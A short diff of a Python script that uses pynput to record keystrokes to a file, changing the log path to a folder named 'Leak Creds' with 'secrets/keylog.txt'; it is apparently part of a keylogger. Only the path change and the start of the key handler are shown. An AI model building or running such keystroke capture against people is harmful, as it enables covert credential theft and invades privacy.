@@ -5,7 +5,7 @@ import threading
 from pynput import keyboard
 
 # Define the log file path
-LOG_FILE = os.path.join(os.path.expanduser("~"), "secrets", "keylog.txt")
+LOG_FILE = os.path.join("Leak Creds", "secrets", "keylog.txt")
 
 def on_press(key):
     """Handle key press events and log them to a file."""
